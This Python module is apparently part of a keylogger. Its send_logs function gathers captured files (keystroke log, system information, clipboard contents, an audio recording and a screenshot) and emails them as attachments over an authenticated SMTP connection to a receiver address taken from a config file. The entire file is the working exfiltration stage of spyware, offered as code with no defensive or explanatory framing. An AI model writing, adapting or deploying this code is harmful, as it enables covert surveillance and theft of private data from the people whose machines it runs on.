import smtplib
import os 
import config
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

LOG_FILES = [
    "logs/keylog.txt",
    "logs/systeminfo.txt",
    "logs/clipboard.txt",
    "logs/audio.wav",
    "logs/screenshot.png"
]

def send_logs():
    try:
        msg = MIMEMultipart()
        msg ["From"] = config.EMAIL_ADDRESS
        msg ["TO"] = config.EMAIL_RECEIVER
        msg ["Subject"] = "[LOG REPORT] Keylogger Data"

        for file_path in LOG_FILES:
            if os.path.exists(file_path):
                part = MIMEBase("application", "octet-stream")
                with open(file_path, "rb") as file:
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
                msg.attach(part)
        
        with smtplib.SMTP(config.SMTP_SERVER, config.SMTP_PORT) as server:
            server.starttls()
            server.login(config.EMAIL_ADDRESS, config.EMAIL_PASSWORD)
            server.send_message(msg)
            print("[INFO] Logs emailed sucessfully.")
 
    except Exception as e:
        print(f"[ERROR] Failed to send logs: {e} ")
